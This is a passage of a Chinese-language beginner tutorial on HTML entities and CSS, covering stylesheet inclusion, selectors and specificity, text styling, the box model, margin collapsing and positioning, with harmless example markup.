<p>这里我们就要提到一个名词叫做编码集了。我们在书写html的时候，很多特殊的符号是无法写出来的，这个时候我们只能用编码来让浏览器识别我们所想的符号，编码的格式是<code>&amp;编码;</code>。空格的编码就是<code>&amp;nbsp;</code>，在页面中我们就可以看到空格了。</p>
<p>其次，用来当做标签的尖括号&lt;&gt;也是无法正常通过符号来显示出来的，我们同样需要用编码集让浏览器识别出来。&lt; 小于号的编码是<code>&amp;lt;</code>，less than的意思，同理，&gt; 大于号的编码是<code>&amp;gt;</code>，great than的意思。我们只要在html中写这两个编码，大于号和小于号就可以正常显示出来了。</p>
<p>回车也属于分隔符，在html中回车是没有作用的，我们想要在网页上让文字显示出回车换行的效果的话，编码也是没有办法实现的，我们需要一个标签叫<code>&lt;br&gt;</code>标签，这个标签的作用就是换行。<code>&lt;br&gt;</code> 标签是空标签（意味着它没有结束标签，因此<code>&lt;br&gt;&lt;/br&gt;</code>是错误的），也可以把结束标签放在开始标签中，也就是 <code>&lt;br /&gt;</code>。</p>
<p>》》》》》》》》》</p>
<h1 id="css"><a href="#css" class="headerlink" title="css"></a>css</h1><p>css全称Cascading Style Sheets，层叠样式表。它的主要作用是为html标签添加各种样式效果。</p>
<p>本章属于css2.0知识，css3.0知识会在后面章节中介绍。</p>
<h2 id="如何引入css"><a href="#如何引入css" class="headerlink" title="如何引入css"></a>如何引入css</h2><p>css的引入方式一共有4种：</p>
<p>1.行间样式，直接在html标签上写style属性，<code>&lt;div style=&quot;color: red&quot;&gt;&lt;div&gt;</code>。</p>
<p>2.页面级css，在head标签里面添加一个style标签</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">style</span>&gt;</span></span><br><span class="line">    div &#123;</span><br><span class="line">      color: red;</span><br><span class="line">    &#125;</span><br><span class="line">  <span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>3.外部css文件(推荐)，我们在外部创建一个.css后缀的文件，然后在html里面引入这个外部的css文件即可。</p>
<p>在head标签里面加上一个link标签。</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">link</span> <span class="attr">rel</span>=<span class="string">"stylesheet"</span> <span class="attr">href</span>=<span class="string">"index.css"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>4.import方式引入(已经弃用)</p>
<p>有两种写法：</p>
<p>1.在head标签里面写一个style标签，在第一行写上@import url()，url里面写上css文件的地址。</p>
<p>2.在css中直接使用</p>
<p><code>@import url(CSS文件路径地址)</code></p>
<p>这种引入方式有几种缺点导致它现在被弃用了：</p>
<p>1.import规则一定要写在除了@charset外的其他任何CSS规则之前，若有多个则一起写在最前面，否则失效。</p>
<p>下面这种写法会失效：</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">style</span> <span class="attr">type</span>=<span class="string">"text/css"</span>&gt;</span></span><br><span class="line">  div &#123;</span><br><span class="line">    color: orange;</span><br><span class="line">  &#125;</span><br><span class="line"><span class="css">  <span class="keyword">@import</span> <span class="string">"import.css"</span>;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>2.程序读到import的时候，会忽略掉import，等到html里面的所有内容包括图片在内的所有资源全都加载完毕之后才加载import的css文件。也就是说，import引入的css文件和html的加载是同步进行的。</p>
<p>一般推荐使用link标签引入外部css文件的方式</p>
<p>优点如下：</p>
<p>1.有利于SEO。引用外部css文件，使得html页面的源代码减少很多，搜索引擎蜘蛛爬行更快。</p>
<p>2.浏览器可以开启多线程同时下载html和css，加载速度一般会快些。</p>
<p>3.样式文件分离，修改样式更方便，特别是整站共用的css样式，只需修改公共css文件就行了。</p>
<h2 id="css选择器"><a href="#css选择器" class="headerlink" title="css选择器"></a>css选择器</h2><p>css选择器的作用是让我们找到想要修改样式的元素，然后为其修改样式。</p>
<p>选择器有很多种：</p>
<h3 id="1-id选择器"><a href="#1-id选择器" class="headerlink" title="1.id选择器"></a>1.id选择器</h3><p>我们给元素添加一个id属性，这个id是唯一标识，一个元素只能有一个id，一个id原则上也只能给一个元素。然后在css文件中，可以通过<code>#id {}</code>的方式选择这个元素。<br><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">style</span>&gt;</span></span><br><span class="line"><span class="css">  <span class="selector-id">#demo</span> &#123;</span></span><br><span class="line">    color: red;</span><br><span class="line">  &#125;</span><br><span class="line"><span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">"demo"</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure></p>
<h3 id="2-class类选择器"><a href="#2-class类选择器" class="headerlink" title="2.class类选择器"></a>2.class类选择器</h3><p>我们给元素添加一个class属性，这个属性为元素添加了一个类名，每一个元素可以有多个类名，同一个类名也可以赋给多个元素。然后我们在css文件中，可以通过<code>.class {}</code>的方式来选择添加了类名的元素。</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">style</span>&gt;</span></span><br><span class="line"><span class="css">  <span class="selector-class">.demo</span> &#123;</span></span><br><span class="line">    color: red;</span><br><span class="line">  &#125;</span><br><span class="line"><span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">”demo”</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure>
<h3 id="3-标签选择器"><a href="#3-标签选择器" class="headerlink" title="3.标签选择器"></a>3.标签选择器</h3><p>通过标签名可以直接选择元素。</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">style</span>&gt;</span></span><br><span class="line">  div &#123;</span><br><span class="line">    color: red;</span><br><span class="line">  &#125;</span><br><span class="line"><span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure>
<h3 id="4-通配符选择器"><a href="#4-通配符选择器" class="headerlink" title="4.通配符选择器 *{}"></a>4.通配符选择器 *{}</h3><p>所有标签都会被选择出来。</p>
<h3 id="5-属性选择器"><a href="#5-属性选择器" class="headerlink" title="5.属性选择器"></a>5.属性选择器</h3><p><code>[id] {}</code>,这样有id属性的元素都会被选择出来，类似还有<code>[class] {}</code>、<code>[class=&quot;demo&quot;] {}</code>等。</p>
<h3 id="6-父子选择器（派生选择器）"><a href="#6-父子选择器（派生选择器）" class="headerlink" title="6.父子选择器（派生选择器）"></a>6.父子选择器（派生选择器）</h3><p><code>div p {}</code></p>
<p>给div下面的p加样式。</p>
<p>在实际开发中，因为要注意选择器的性能，一般父子选择器不超过4层。</p>
<p>像.wrapper .box .content .name这样不超过四层。</p>
<h3 id="7-直接子元素选择器"><a href="#7-直接子元素选择器" class="headerlink" title="7.直接子元素选择器"></a>7.直接子元素选择器</h3><p><code>div&gt;strong</code>,div直接子元素是strong才能被选择。</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">strong</span>&gt;</span><span class="tag">&lt;/<span class="name">strong</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">√</span><br><span class="line"><span class="tag">&lt;<span class="name">div</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">em</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">strong</span>&gt;</span><span class="tag">&lt;/<span class="name">strong</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">em</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">×</span><br></pre></td></tr></table></figure>
<p>前面举的例子都是标签组合的父子选择器，id、class等也可以使用父子选择器哦。</p>
<h3 id="8-并列选择器"><a href="#8-并列选择器" class="headerlink" title="8.并列选择器"></a>8.并列选择器</h3><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">p</span> <span class="attr">class</span>=<span class="string">"select"</span>&gt;</span><span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"select"</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>怎么选择出类名是select的div呢？</p>
<p>我们可以使用<code>div.select {}</code>来选择</p>
<p>这种方式是只有div和.select同时作用在一个元素上才会被选择出来。</p>
<h3 id="9-分组选择器"><a href="#9-分组选择器" class="headerlink" title="9.分组选择器"></a>9.分组选择器</h3><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">p</span>&gt;</span><span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">strong</span>&gt;</span><span class="tag">&lt;/<span class="name">strong</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">em</span>&gt;</span><span class="tag">&lt;/<span class="name">em</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>我们要想同时选择四个标签，把四个标签的样式都写一遍显然是不太合适的，这里可以用分组选择器<code>div, p, em, strong {}</code>，这样四种标签就都被选择出来并且加上统一的样式了.</p>
<h2 id="选择器的优先级"><a href="#选择器的优先级" class="headerlink" title="选择器的优先级"></a>选择器的优先级</h2><p>如果我们在单独的样式后面加上 !important，那么这个样式就会被赋予最高的优先级，一般后面无论怎么添加样式都不会覆盖或修改这个样式。比如：<code>background-color: red !important;</code>，后面怎么添加样式background-color都是红色的。</p>
<p>由此可见选择器是有优先级的，优先级高的选择器会覆盖优先级低的选择器的样式。</p>
<p>常用选择器的优先级为：!important &gt; 行间样式（通过标签的style属性设置） &gt; id &gt; class|属性 &gt; 标签 &gt; * </p>
<p>我们还需要记住每一种选择器的权重值</p>
<p>CSS选择器 权重值</p>
<p>!important 无穷大</p>
<p>行间样式 1000</p>
<p>id 100</p>
<p>class、属性、伪类 10</p>
<p>标签、伪元素 1</p>
<p>通配符 0</p>
<p>和数学里不一样，在css选择器的权重值中，无穷大 + 1 &gt; 无穷大。</p>
<p>有了选择器权重值，我们就可以计算父子选择器的权重值了。</p>
<figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="selector-tag">div</span> <span class="selector-tag">p</span> &#123;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这个选择器的权重值是div + p（两个标签选择器）相加后的结果。</p>
<p>最后需要补充一下：</p>
<ol>
<li>我们一般不给标签加id，而是通过添加class类名来选择，因为id代表唯一标识，我们一般用id来做标记。</li>
<li>我们写类名的时候，一定要注意命名语义化，不要用abc之类无含义的类名。</li>
</ol>
<h2 id="简单的文字样式"><a href="#简单的文字样式" class="headerlink" title="简单的文字样式"></a>简单的文字样式</h2><p>css样式有很多 ，我们不可能一一都记住它们，我们建议记住一些常用的样式，其它的用到时再去查就可以了。</p>
<p>首先我们介绍一下样式的构成，它都是由属性名和属性值构成的，名和值之间用:(冒号)分隔，属性和属性之间用;(分号)分隔。</p>
<p>我们先来介绍几个字体相关的样式。<br><figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="selector-tag">p</span> &#123;</span><br><span class="line">  font-size: 20px; // 字体大小</span><br><span class="line">  font-weight: bold; // 字体粗细</span><br><span class="line">  font-family: "Times New Roman", Georgia, Serif;// 字体系列</span><br><span class="line">  font-style: italic; // 字体风格</span><br><span class="line">  color: red; // 字体颜色</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>1.font-size</p>
<p>设置文字的大小，默认是16px，这条属性设置的其实是文字的高度而不是宽度。</p>
<p>2.font-weight</p>
<p>设置文字的粗细，默认值是normal，当我们设置成bold的时候，这个p标签就和strong标签没什么区别了，这就是为什么很多标签我们都不用，因为通过修改样式可以达到和其他标签一样的效果。</p>
<p>它的值有：</p>
<p>normal 默认值<br>bold 粗体字符。<br>bolder 更粗的字符。<br>lighter 更细的字符。<br>100、200、300、400、500、600、700、800、900 定义由细到粗的字符，400等同于normal，700等同于bold。</p>
<p>3.font-family</p>
<p>设置文字的样式，是黑体、宋体还是其他什么字体，默认是arial字体。</p>
<p>4.font-style</p>
<p>设置文字是否斜体，italic是斜体的意思，通过设置这个属性我们可以让p标签达到和em标签一样的效果。它可以使用斜体、倾斜或正常字体。</p>
<p>5.color属性</p>
<p>设置文字的颜色</p>
<p>颜色值可以有三种表达方式。</p>
<p>1.英文单词，如red、black、blue等等。</p>
<p>2.三位十六进制组成光学三原色红绿蓝，每一个的值都是00-ff，00代表空，ff代表满，例如#000000就是黑色的意思。其中，如果每连续的两位都是一样的，并且3组数字都是这种情况的时候，我们就可以两两合并只写一个数值就可以了，比如#ffffff —&gt; #fff、 #55ffcc —&gt; #5fc。</p>
<p>3.通过rgb(xx,xx,xx)属性值来设置颜色，其实和第二种是一个意思，只是把十六进制换成了十进制，rgb就是red、green、blue的缩写，三个数值每一项的范围都是0-255，例如红色就是rgb(255, 0, 0)。</p>
<p>接下来我们再介绍其他一些简单的样式。</p>
<p>6.text-indent</p>
<p>设置首行文字的缩进，值有两种单位，一种是px，一种是em。</p>
<p>这里就要提一下em和px的区别了。</p>
<p>px虽然不是一个绝对长度单位，不同设备上显示会有区别，但我们可以简单理解为它是一个差不多固定长度的单位。</p>
<p>em是一个相对长度单位，它相对的是当前元素内的文字的大小，也就是说<code>1em = 1 * font-size</code>,如果我们设置font-size是20px的话，那么1em就是20px，我们只要将text-indent设置成2em就可以实现首行缩进2个文字大小了。</p>
<p>7.border</p>
<p><code>border: 1px solid red;</code>,设置元素边框样式。</p>
<p>这其实是一个复合属性，它由border-width、border-style、border-color三个属性复合而成，分别设置边框的宽度，边框的样式，边框的颜色。其中边框的样式有很多种，常用的有solid（实线）、dotted（短虚线）、dashed（长条虚线）。</p>
<p>border-width也是一个复合属性，它可以按照上右下左来分别设置四个边框的宽度值。</p>
<p>8.text-align</p>
<p>设置文字的位置，值有三种，分别是center(居中)、left(左对齐)、right(右对齐)。</p>
<p>9.line-height</p>
<p>设置一行文字所占的高度，默认和字体大小一样。</p>
<p>当我们想要让单行文字在容器内部上下居中的时候，我们只需要让height = line-height就行了。</p>
<p>10.text-decoration</p>
<p>文字装饰的意思，可以设置文字是否有下划线、上划线、中划线，分别对应的属性值是underline、overline、line-through。</p>
<p>11.cursor</p>
<p>设置我们的鼠标移入到这个元素上的时候，鼠标会变成什么样子。</p>
<p>它的值有很多，常用的是<code>cursor: pointer;</code>这条属性，它会让我们鼠标在移入这个元素的时候，变成可以点击的小手状态。</p>
<p>现在我们就可以来模拟一下a标签的样式了。</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">style</span>&gt;</span></span><br><span class="line">  p &#123;</span><br><span class="line">    color: rgb(0, 0, 238); </span><br><span class="line">    text-decoration: underline;</span><br><span class="line">    cursor: pointer;</span><br><span class="line">  &#125;</span><br><span class="line"><span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">p</span>&gt;</span>www.baidu.com<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br></pre></td></tr></table></figure>
<h2 id="伪类"><a href="#伪类" class="headerlink" title="伪类"></a>伪类</h2><p>下面介绍一下伪类。</p>
<p>我们可以通过在标签名后面添加伪类来达到一些效果。</p>
<p>1.hover伪类</p>
<p>这个伪类设置当鼠标移入元素的时候元素的样式。</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">style</span>&gt;</span></span><br><span class="line"><span class="css">  <span class="selector-tag">a</span><span class="selector-pseudo">:hover</span> &#123; </span></span><br><span class="line">    font-size: 20px;</span><br><span class="line"><span class="css">    <span class="selector-tag">color</span>: <span class="selector-id">#424242</span>; </span></span><br><span class="line">  &#125;</span><br><span class="line"><span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"www.baidu.com"</span>&gt;</span>www.baidu.com<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>给a标签设置这样一个伪类之后，我们就可让鼠标移入a标签后，文字放大（颜色不会变）。</p>
<p>伪类当然不止hover一个，还有很多其他的伪类，这里就不一一介绍了。</p>
<p>伪类也是有权重值的，它的权重值和class一样是10。</p>
<p>前面鼠标移入只会有文字放大效果而不会有变色效果，就是因为行间样式的权重值是1000，而a+hover只有1+10=11。</p>
<h2 id="盒模型"><a href="#盒模型" class="headerlink" title="盒模型"></a>盒模型</h2><p>我们要知道，一个元素是由四部分组成的：margin、border、padding、content，分别是外边距、边框、内边距、内容区。其中content不是由属性构成的，而是由我们写的东西和width、height属性构成的。</p>
<p>margin：它设置的是这个元素距离外面靠近它的其他元素或者浏览器边框的距离。<br>这是一个复合属性，它其实是由margin-top、margin-right、margin-bottom、margin-left组成的，当然也可以分别设置每一个属性的属性值。</p>
<p>这个复合属性的值有4种写法：</p>
<p>1.margin: 10px 20px 30px 50px;分别按照上右下左的顺序设置四个外边距的大小。</p>
<p>2.margin: 10px 20px 30px;分别按照上、左右、下的顺序来设置四个外边距的大小，中间的那个属性值设置的是左右的外边距。</p>
<p>3.margin: 10px 20px;分别按照上下、左右的顺序来设置四个外边距的大小。</p>
<p>4.margin: 10px;四个方向都是这个值。</p>
<p>margin其实不属于一个盒子的模型部分，一个元素的盒子模型只有border、padding、content。</p>
<p>我们只需要在元素上鼠标右键点击检查或者查看，或是按住F12（windows系统），就可以查看元素设置的样式了，最下面也会有元素的盒模型。</p>
<h2 id="margin合并与塌陷"><a href="#margin合并与塌陷" class="headerlink" title="margin合并与塌陷"></a>margin合并与塌陷</h2><p>css也有不完善的地方，存在或多或少的”bug”，有些我们可能从来不会遇到，有些我们可能会经常遇到，这节介绍的就是很经典的两个”bug”。</p>
<h3 id="margin合并"><a href="#margin合并" class="headerlink" title="margin合并"></a>margin合并</h3><p>我们写两个span标签，给它们两个分别加上margin-right和margin-left样式。<br><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">style</span>&gt;</span></span><br><span class="line"><span class="css"><span class="selector-class">.left</span> &#123;</span></span><br><span class="line">  margin-right: 10px;</span><br><span class="line">  background-color: red;</span><br><span class="line">&#125;</span><br><span class="line"><span class="css"><span class="selector-class">.right</span> &#123;</span></span><br><span class="line">  margin-left: 10px;</span><br><span class="line">  background-color: yellow;</span><br><span class="line">&#125;</span><br><span class="line"><span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">span</span> <span class="attr">class</span>=<span class="string">"left"</span>&gt;</span>left<span class="tag">&lt;/<span class="name">span</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">span</span> <span class="attr">class</span>=<span class="string">"right"</span>&gt;</span>right<span class="tag">&lt;/<span class="name">span</span>&gt;</span></span><br></pre></td></tr></table></figure></p>
<p>这两个span之间的距离正是我们所想的那样是20px，</p>
<p>下面我们写两个div，分别给它们加上margin-bottom和margin-top的样式，我们再看看效果。</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">style</span>&gt;</span></span><br><span class="line"><span class="css"><span class="selector-class">.top</span> &#123;</span></span><br><span class="line">  margin-bottom: 10px;</span><br><span class="line">  background-color: red;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="css"><span class="selector-class">.bottom</span> &#123;</span></span><br><span class="line">  margin-top: 10px;</span><br><span class="line">  background-color: yellow;</span><br><span class="line">&#125;</span><br><span class="line"><span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"top"</span>&gt;</span>top<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"bottom"</span>&gt;</span>bottom<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>这次我们惊奇地发现，这两个div上下之间的距离，并不是我们所想的那样是相加的20px，而是只有10px。</p>
<p>这个现象就是margin合并。</p>
<p>我们尝试改变每一个div的margin-top或者margin-bottom的值，最后会发现：二者上下之间的距离取的是两个数值之中的最大值。</p>
<h3 id="margin塌陷"><a href="#margin塌陷" class="headerlink" title="margin塌陷"></a>margin塌陷</h3><p>当我们给父子结构的两个div分别设置margin-top的时候，就会出现这个bug。</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">style</span>&gt;</span></span><br><span class="line"><span class="css">  <span class="selector-class">.wrapper</span> &#123;</span></span><br><span class="line">    width: 100px;</span><br><span class="line">    height: 100px;</span><br><span class="line">    margin-top: 100px;</span><br><span class="line">    margin-left: 100px;</span><br><span class="line">    background-color: yellow;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line"><span class="css">  <span class="selector-class">.content</span> &#123;</span></span><br><span class="line">    width: 50px;</span><br><span class="line">    height: 50px;</span><br><span class="line">    margin-top: 50px;</span><br><span class="line">    margin-left: 50px;</span><br><span class="line">    background-color: red;</span><br><span class="line">  &#125;</span><br><span class="line"><span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">“wrapper”</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">“content”</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>我们写这段代码的原意是想要一个100<em>100大小的div,然后里面有一个50</em>50大小的子div。这个div在父级div的右下角，同时父级div距离浏览器的边框有100px的距离。</p>
<p>然而实际结果并不是这个样子的，子级div的margin-left正常显示了，但是margin-top的效果并不是我们所想的那样距离父级div的距离是50px。</p>
<p>由于子级的div距离浏览器边框的距离是50px，父级div本身有一个margin-top值，所以导致我们子级的margin-top的效果并没有显现出来。我们再改变一下子级div的margin-top值，改成200px，我们惊奇地发现，子级div不仅没有距离父级div有一段距离，反而带动了父级div一起向下移动了！这就是margin塌陷现象。</p>
<h3 id="解法"><a href="#解法" class="headerlink" title="解法"></a>解法</h3><p>答案是触发bfc。</p>
<p>bfc全称是block format context——块级格式化上下文，我们有一些css语法会触发bfc，触发bfc的元素的渲染规则和普通元素的渲染规则相比会变得不一样，从而可以解决塌陷问题。</p>
<p>我们可以利用overflow属性来触发bfc。</p>
<p>overflow是一个css属性，它可以设置当内容区超过了当前元素的区域的时候，我们采取怎样的处理方式，这个属性也可以触发bfc。</p>
<p>现在我们在父级div.wrapper里面加一条属性：overflow:hidden;</p>
<p>这条属性的意思是溢出隐藏。现在我们发现，在外观没有改变的同时，子级div和父级div解除了绑定，可能正常移动了！我们一般可以采用这种方式来解决margin塌陷的问题。</p>
<p>虽然overflow:hidden;的方式可以采用，但也不是没有缺点，一旦我们用js代码改变了子级div的位置，就会有导致子级一部分内容因为溢出而被隐藏。</p>
<p>理解了margin塌陷的解法之后，我们就很容易可以理解margin合并的解法了。</p>
<p>我们给每一个div分别加上一个父级包裹层，然后给父级包裹层都加上overflow:hidden;</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">style</span>&gt;</span></span><br><span class="line"><span class="css"><span class="selector-class">.wrapper</span>&#123;</span></span><br><span class="line">  overflow: hidden;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="css"><span class="selector-class">.top</span> &#123;</span></span><br><span class="line">  margin-bottom: 100px;</span><br><span class="line">  background-color: red;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="css"><span class="selector-class">.bottom</span> &#123;</span></span><br><span class="line">  margin-top: 100px;</span><br><span class="line">  background-color: red;</span><br><span class="line">&#125;</span><br><span class="line"><span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"wrapper"</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"top"</span>&gt;</span>top<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"wrapper"</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"bottom"</span>&gt;</span>bottom<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>这样通过父级div来触发bfc就解决了margin合并的问题。</p>
<h2 id="定位与层模型"><a href="#定位与层模型" class="headerlink" title="定位与层模型"></a>定位与层模型</h2><p>层模型</p>
<p>css中元素的层次模型主要是由position这个属性来决定的。</p>
<p>position的意思是定位，它一共有四个值，分别是static、absolute、relative、fixed。</p>
<p>1.static</p>
<p>static是默认值，当我们没有写position属性的时候，元素默认的定位就是static。</p>
<p>2.absolute</p>
<p>absolute是绝对定位的意思，它会使元素脱离本来的位置再进行定位，当元素脱离原来的位置之后，其他的元素就看不到这个元素了。同时，absolute也可以触发bfc。</p>
<p>当我们改变定位之后，这个元素就有四个属性可以使用了，分别是left、right、top、bottom。这四个属性分别可以设置当前元素距离左边、右边、上边和下边的距离为多少，这四个属性很少一起出现，一般都是两两一对出现，其中left和top是一对，right和bottom是一对。</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">style</span>&gt;</span></span><br><span class="line">  div &#123;</span><br><span class="line">    width: 100px;</span><br><span class="line"><span class="css">    <span class="selector-tag">height</span><span class="selector-pseudo">:100px</span>;</span></span><br><span class="line">    backgroud-color: red;</span><br><span class="line">    position: absolute;</span><br><span class="line">    left: 100px;</span><br><span class="line">    top: 100px;</span><br><span class="line">  &#125;</span><br><span class="line"><span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>这个div就会脱离原来的位置，然后距离浏览器上边框和左边框分别100px的距离。</p>
<p>absolute的参照物是距离它最近的有定位（非static）的父级，当没有父级有定位时，元素会相对于浏览器边框进行定位。</p>
<p>3.relative</p>
<p>relative是相对定位的意思，它会让元素保留原来位置再进行定位，后面的元素可以看到它本来的位置。</p>
<p>当position改成relative之后，left、top、right、bottom进行的定位就会变成相对于自身的位置进行移动了。relative定位的参照物是元素自身。</p>
<p>当我们仅仅给元素设置position:relative，而没有设置left、right、top、bottom属性的时候，元素的定位是没有发生任何改变的，正因为这个特性，一般在开发中，relative都是用作设置参照物，一个absolute元素要相对于那个元素进行移动，就给那个元素设置relative定位就可以了。</p>
<p>我们通过例子来看一下absolute和relative的区别。</p>
<p>我们现在有这样一个结构：<br><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">style</span>&gt;</span></span><br><span class="line"><span class="css">  <span class="selector-class">.wrapper</span> &#123;</span></span><br><span class="line">      width: 200px;</span><br><span class="line">      height: 200px;</span><br><span class="line">      background-color: orange;</span><br><span class="line">      margin-top: 100px;</span><br><span class="line">      margin-left: 100px;</span><br><span class="line">  &#125;</span><br><span class="line"><span class="css">  <span class="selector-class">.box</span>&#123;</span></span><br><span class="line"><span class="css">      <span class="selector-tag">width</span><span class="selector-pseudo">:100px</span>;</span></span><br><span class="line">      height: 100px;</span><br><span class="line">      background-color: black;      </span><br><span class="line"><span class="css">      <span class="selector-tag">margin-left</span><span class="selector-pseudo">:100px</span>;</span></span><br><span class="line">  &#125;</span><br><span class="line"><span class="css">  <span class="selector-class">.content</span>&#123;</span></span><br><span class="line">      width: 50px;</span><br><span class="line">      height: 50px;</span><br><span class="line">      background-color: yellow;</span><br><span class="line">  &#125;</span><br><span class="line"><span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"wrapper"</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"box"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"content"</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">  <span 